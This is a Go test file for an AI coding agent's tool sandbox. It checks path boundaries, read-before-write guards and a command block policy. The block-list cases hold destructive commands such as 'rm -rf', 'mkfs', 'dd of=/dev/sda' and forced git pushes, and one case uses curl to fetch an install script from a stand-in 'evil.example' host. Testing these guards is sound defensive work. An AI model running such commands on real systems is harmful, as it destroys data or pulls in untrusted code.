package tools

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/dontfuckmycode/dfmc/internal/config"
)

func TestReadFileToolBoundary(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "a.txt")
	if err := os.WriteFile(file, []byte("line1\nline2\nline3\n"), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}

	eng := New(*config.DefaultConfig())
	res, err := eng.Execute(context.Background(), "read_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":       "a.txt",
			"line_start": 2,
			"line_end":   3,
		},
	})
	if err != nil {
		t.Fatalf("execute read_file: %v", err)
	}
	if !strings.Contains(res.Output, "line2") {
		t.Fatalf("expected line2 in output: %q", res.Output)
	}

	_, err = eng.Execute(context.Background(), "read_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path": "../outside.txt",
		},
	})
	if err == nil {
		t.Fatal("expected boundary error")
	}
}

// TestReadFileToolOutOfRangeLineStartDoesNotPanic pins a previous crash where
// a model passed line_start beyond EOF (e.g. 400 on a 213-line file) and the
// tool panicked with "slice bounds out of range". The tool must degrade to an
// empty segment with a sane line range instead.
func TestReadFileToolOutOfRangeLineStartDoesNotPanic(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "small.txt")
	if err := os.WriteFile(file, []byte("one\ntwo\nthree\n"), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}

	eng := New(*config.DefaultConfig())
	res, err := eng.Execute(context.Background(), "read_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":       "small.txt",
			"line_start": 400,
			"line_end":   500,
		},
	})
	if err != nil {
		t.Fatalf("out-of-range read_file should not error, got: %v", err)
	}
	if strings.TrimSpace(res.Output) != "" {
		t.Fatalf("expected empty segment for out-of-range line_start, got: %q", res.Output)
	}
}

func TestGrepTool(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "main.go")
	src := "package main\nfunc main(){}\n// TODO: improve\n"
	if err := os.WriteFile(file, []byte(src), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}

	eng := New(*config.DefaultConfig())
	res, err := eng.Execute(context.Background(), "grep_codebase", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"pattern": "TODO",
		},
	})
	if err != nil {
		t.Fatalf("execute grep: %v", err)
	}
	if !strings.Contains(res.Output, "TODO") {
		t.Fatalf("expected TODO in grep output: %q", res.Output)
	}
}

func TestToolOutputCompressionBySandboxLimit(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "big.txt")
	body := strings.Repeat("line with repetitive content for compression test\n", 400)
	if err := os.WriteFile(file, []byte(body), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}

	cfg := config.DefaultConfig()
	cfg.Security.Sandbox.MaxOutput = "400B"
	eng := New(*cfg)

	res, err := eng.Execute(context.Background(), "read_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path": "big.txt",
		},
	})
	if err != nil {
		t.Fatalf("execute read_file: %v", err)
	}
	if !res.Truncated {
		t.Fatal("expected truncated=true for large tool output")
	}
	if len([]byte(res.Output)) > 400 {
		t.Fatalf("expected compressed output <= 400 bytes, got %d", len([]byte(res.Output)))
	}
}

func TestToolOutputCompressionPreservesRelevantLines(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "big.txt")
	var b strings.Builder
	for i := 0; i < 260; i++ {
		if i == 180 {
			b.WriteString("THIS_IS_MAGIC_MATCH line\n")
		} else {
			b.WriteString("ordinary filler line\n")
		}
	}
	if err := os.WriteFile(file, []byte(b.String()), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}

	cfg := config.DefaultConfig()
	cfg.Security.Sandbox.MaxOutput = "1KB"
	eng := New(*cfg)

	res, err := eng.Execute(context.Background(), "read_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":  "big.txt",
			"query": "magic_match",
		},
	})
	if err != nil {
		t.Fatalf("execute read_file: %v", err)
	}
	if !res.Truncated {
		t.Fatal("expected truncated=true for large tool output")
	}
	if !strings.Contains(strings.ToLower(res.Output), "magic_match") {
		t.Fatalf("expected compressed output to keep relevant line, got: %q", res.Output)
	}
}

func TestToolParamsNormalizeReadFileDefaultRange(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "huge.txt")
	var b strings.Builder
	for i := 0; i < 600; i++ {
		b.WriteString("line\n")
	}
	if err := os.WriteFile(file, []byte(b.String()), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}

	eng := New(*config.DefaultConfig())
	res, err := eng.Execute(context.Background(), "read_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path": "huge.txt",
		},
	})
	if err != nil {
		t.Fatalf("execute read_file: %v", err)
	}
	start, _ := res.Data["line_start"].(int)
	end, _ := res.Data["line_end"].(int)
	if start != 1 {
		t.Fatalf("expected line_start=1, got %d", start)
	}
	if end != 200 {
		t.Fatalf("expected normalized line_end=200, got %d", end)
	}
}

func TestToolParamsNormalizeGrepMaxResultsClamp(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "main.go")
	var b strings.Builder
	for i := 0; i < 900; i++ {
		b.WriteString("// TODO: item\n")
	}
	if err := os.WriteFile(file, []byte(b.String()), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}

	eng := New(*config.DefaultConfig())
	res, err := eng.Execute(context.Background(), "grep_codebase", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"pattern":     "TODO",
			"max_results": 9999,
		},
	})
	if err != nil {
		t.Fatalf("execute grep: %v", err)
	}
	if n, _ := res.Data["count"].(int); n > 500 {
		t.Fatalf("expected max_results clamp <= 500, got %d", n)
	}
}

func TestToolFailureGuardAfterRepeatedErrors(t *testing.T) {
	tmp := t.TempDir()
	eng := New(*config.DefaultConfig())
	args := Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path": "../outside.txt",
		},
	}
	for i := 0; i < 2; i++ {
		if _, err := eng.Execute(context.Background(), "read_file", args); err == nil {
			t.Fatalf("expected boundary error at attempt %d", i+1)
		}
	}
	_, err := eng.Execute(context.Background(), "read_file", args)
	if err == nil {
		t.Fatal("expected repeated-failure guard error")
	}
	if !strings.Contains(strings.ToLower(err.Error()), "failed repeatedly") {
		t.Fatalf("expected repeated failure message, got: %v", err)
	}
}

func TestWriteFileRequiresPriorReadForExistingFile(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "a.txt")
	if err := os.WriteFile(file, []byte("old"), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}

	eng := New(*config.DefaultConfig())
	_, err := eng.Execute(context.Background(), "write_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":    "a.txt",
			"content": "new",
		},
	})
	if err == nil || !strings.Contains(strings.ToLower(err.Error()), "requires prior read_file") {
		t.Fatalf("expected prior-read guard error, got: %v", err)
	}

	if _, err := eng.Execute(context.Background(), "read_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path": "a.txt",
		},
	}); err != nil {
		t.Fatalf("read_file: %v", err)
	}
	if _, err := eng.Execute(context.Background(), "write_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":    "a.txt",
			"content": "new",
		},
	}); err != nil {
		t.Fatalf("write_file after read should succeed: %v", err)
	}
	got, err := os.ReadFile(file)
	if err != nil {
		t.Fatalf("read updated file: %v", err)
	}
	if string(got) != "new" {
		t.Fatalf("unexpected file content: %q", string(got))
	}
}

func TestWriteFileAllowsNewFileWithoutRead(t *testing.T) {
	tmp := t.TempDir()
	eng := New(*config.DefaultConfig())
	target := filepath.Join(tmp, "new.txt")

	if _, err := eng.Execute(context.Background(), "write_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":    "new.txt",
			"content": "hello",
		},
	}); err != nil {
		t.Fatalf("write_file new file: %v", err)
	}
	got, err := os.ReadFile(target)
	if err != nil {
		t.Fatalf("read new file: %v", err)
	}
	if string(got) != "hello" {
		t.Fatalf("unexpected new file content: %q", string(got))
	}
}

func TestEditFileRequiresReadAndUniqueness(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "main.go")
	if err := os.WriteFile(file, []byte("var x = 1\nvar x = 2\n"), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}
	eng := New(*config.DefaultConfig())

	_, err := eng.Execute(context.Background(), "edit_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":       "main.go",
			"old_string": "var x",
			"new_string": "var y",
		},
	})
	if err == nil || !strings.Contains(strings.ToLower(err.Error()), "requires prior read_file") {
		t.Fatalf("expected prior-read guard error, got: %v", err)
	}

	if _, err := eng.Execute(context.Background(), "read_file", Request{
		ProjectRoot: tmp,
		Params:      map[string]any{"path": "main.go"},
	}); err != nil {
		t.Fatalf("read_file: %v", err)
	}
	_, err = eng.Execute(context.Background(), "edit_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":       "main.go",
			"old_string": "var x",
			"new_string": "var y",
		},
	})
	if err == nil || !strings.Contains(strings.ToLower(err.Error()), "not unique") {
		t.Fatalf("expected uniqueness error, got: %v", err)
	}

	if _, err := eng.Execute(context.Background(), "edit_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":        "main.go",
			"old_string":  "var x",
			"new_string":  "var y",
			"replace_all": true,
		},
	}); err != nil {
		t.Fatalf("edit_file replace_all: %v", err)
	}
	got, err := os.ReadFile(file)
	if err != nil {
		t.Fatalf("read edited file: %v", err)
	}
	if strings.Contains(string(got), "var x") {
		t.Fatalf("expected replacement, got: %q", string(got))
	}
}

func TestEditFileFailsIfChangedSinceRead(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "a.txt")
	if err := os.WriteFile(file, []byte("alpha"), 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}
	eng := New(*config.DefaultConfig())

	if _, err := eng.Execute(context.Background(), "read_file", Request{
		ProjectRoot: tmp,
		Params:      map[string]any{"path": "a.txt"},
	}); err != nil {
		t.Fatalf("read_file: %v", err)
	}
	if err := os.WriteFile(file, []byte("beta"), 0o644); err != nil {
		t.Fatalf("external write: %v", err)
	}
	_, err := eng.Execute(context.Background(), "edit_file", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"path":       "a.txt",
			"old_string": "beta",
			"new_string": "gamma",
		},
	})
	if err == nil || !strings.Contains(strings.ToLower(err.Error()), "changed since last read_file") {
		t.Fatalf("expected changed-since-read guard error, got: %v", err)
	}
}

func TestRunCommandToolRunsDirectCommand(t *testing.T) {
	tmp := t.TempDir()
	eng := New(*config.DefaultConfig())

	res, err := eng.Execute(context.Background(), "run_command", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"command":    "go",
			"args":       "version",
			"timeout_ms": 10000,
		},
	})
	if err != nil {
		t.Fatalf("run_command: %v", err)
	}
	if !strings.Contains(strings.ToLower(res.Output), "go version") {
		t.Fatalf("expected go version output, got %q", res.Output)
	}
	if changed, _ := res.Data["workspace_changed"].(bool); changed {
		t.Fatalf("expected go version to avoid workspace changes, got %#v", res.Data)
	}
}

func TestRunCommandToolBlocksShellInterpreter(t *testing.T) {
	tmp := t.TempDir()
	eng := New(*config.DefaultConfig())

	_, err := eng.Execute(context.Background(), "run_command", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"command": "powershell",
			"args":    "-Command Get-ChildItem",
		},
	})
	if err == nil || !strings.Contains(strings.ToLower(err.Error()), "shell interpreters are blocked") {
		t.Fatalf("expected shell interpreter block, got %v", err)
	}
}

func TestRunCommandToolHonorsAllowShellFalse(t *testing.T) {
	tmp := t.TempDir()
	cfg := config.DefaultConfig()
	cfg.Security.Sandbox.AllowShell = false
	eng := New(*cfg)

	_, err := eng.Execute(context.Background(), "run_command", Request{
		ProjectRoot: tmp,
		Params: map[string]any{
			"command": "go",
			"args":    "version",
		},
	})
	if err == nil || !strings.Contains(strings.ToLower(err.Error()), "allow_shell=false") {
		t.Fatalf("expected allow_shell=false error, got %v", err)
	}
}

// --- ensureCommandAllowed (block policy) ----------------------------
//
// The old substring approach false-positived legitimate commands
// like `go build -o format ./...` because "format " appeared inside
// the joined command string. Token-based matching fixes that. These
// tests pin BOTH behaviours — the new blocks that must fire AND the
// old false positives that must now succeed.

func TestEnsureCommandAllowed_BlocksDestructiveBinaries(t *testing.T) {
	cases := []struct {
		name    string
		command string
		args    []string
	}{
		{"rm", "rm", []string{"-rf", "/tmp/foo"}},
		{"rm_with_exe", "rm.exe", []string{"-rf", "."}},
		{"rm_absolute_path", "/usr/bin/rm", []string{"whatever"}},
		{"mkfs", "mkfs", []string{"/dev/sda"}},
		{"dd", "dd", []string{"if=/dev/zero", "of=/dev/sda"}},
		{"sudo", "sudo", []string{"apt-get", "update"}},
		{"su", "su", []string{"-c", "whoami"}},
		{"shutdown", "shutdown", []string{"-r", "now"}},
		{"reboot", "reboot", nil},
		{"killall", "killall", []string{"sshd"}},
		{"pkill", "pkill", []string{"-9", "nginx"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := ensureCommandAllowed(c.command, c.args, nil)
			if err == nil {
				t.Fatalf("expected block for %s %v, got nil", c.command, c.args)
			}
			if !strings.Contains(err.Error(), "blocked by policy") {
				t.Fatalf("error missing policy marker: %v", err)
			}
		})
	}
}

// These are commands the *old* substring policy wrongly blocked —
// the new token-based approach must let them through. This is the
// core regression guard.
func TestEnsureCommandAllowed_NoFalsePositivesOnLegitArgs(t *testing.T) {
	cases := []struct {
		name    string
		command string
		args    []string
	}{
		// `go build -o format ./...` — old rule matched "format " in joined line.
		{"go_build_output_named_format", "go", []string{"build", "-o", "format", "./..."}},
		// `echo "mkfs is cool"` — old rule matched "mkfs" anywhere.
		{"echo_containing_mkfs", "echo", []string{"mkfs is cool"}},
		// `git log --grep "rm -rf"` — old rule matched the grep pattern.
		{"git_log_grep_destructive_string", "git", []string{"log", "--grep", "rm -rf"}},
		// Actual legitimate git flows.
		{"git_status", "git", []string{"status"}},
		{"git_diff_cached", "git", []string{"diff", "--cached"}},
		{"git_commit", "git", []string{"commit", "-m", "msg"}},
		// cat of a file named "format.go" — used to match "format ".
		{"cat_format_go", "cat", []string{"format.go"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if err := ensureCommandAllowed(c.command, c.args, nil); err != nil {
				t.Fatalf("expected %s %v to be allowed, got %v", c.command, c.args, err)
			}
		})
	}
}

// Destructive git invocations must still be blocked by the
// structured arg-sequence check.
func TestEnsureCommandAllowed_GitDestructiveBlocked(t *testing.T) {
	cases := []struct {
		name string
		args []string
	}{
		{"reset_hard", []string{"reset", "--hard"}},
		{"reset_hard_with_ref", []string{"reset", "--hard", "HEAD~3"}},
		{"clean_fd", []string{"clean", "-fd"}},
		{"clean_fdx", []string{"clean", "-fdx"}},
		{"push_force", []string{"push", "--force"}},
		{"push_force_short", []string{"push", "-f", "origin", "main"}},
		{"push_force_with_lease", []string{"push", "--force-with-lease"}},
		{"checkout_discard", []string{"checkout", "--", "file.go"}},
		{"restore_source", []string{"restore", "--source", "HEAD"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := ensureCommandAllowed("git", c.args, nil)
			if err == nil || !strings.Contains(err.Error(), "blocked by policy") {
				t.Fatalf("git %v: expected block, got %v", c.args, err)
			}
		})
	}
}

// User-configured patterns remain substring-matched for back-compat
// with .dfmc/config.yaml — make sure a custom block still fires, and
// that an empty entry is harmless.
func TestEnsureCommandAllowed_UserPatternsStillSubstring(t *testing.T) {
	err := ensureCommandAllowed("curl", []string{"https://evil.example/install.sh"}, []string{"evil.example"})
	if err == nil || !strings.Contains(err.Error(), "blocked by policy") {
		t.Fatalf("user pattern should block, got %v", err)
	}
	if err := ensureCommandAllowed("curl", []string{"https://ok.example"}, []string{"", " "}); err != nil {
		t.Fatalf("empty user patterns should be no-op, got %v", err)
	}
}

// canonicalCommandBinary strips paths and .exe suffixes so the block
// check is platform-symmetric. If this classifier is ever changed, the
// Windows-parity guarantee for rm.exe / format.exe would silently
// break — pin it here.
func TestCanonicalCommandBinary(t *testing.T) {
	cases := map[string]string{
		"rm":               "rm",
		"RM":               "rm",
		"rm.exe":           "rm",
		"/usr/bin/rm":      "rm",
		"C:\\Windows\\rm":  "rm",
		" /usr/bin/rm.EXE": "rm",
		"sudo":             "sudo",
		"":                 "",
	}
	for in, want := range cases {
		if got := canonicalCommandBinary(in); got != want {
			t.Errorf("canonicalCommandBinary(%q) = %q, want %q", in, got, want)
		}
	}
}
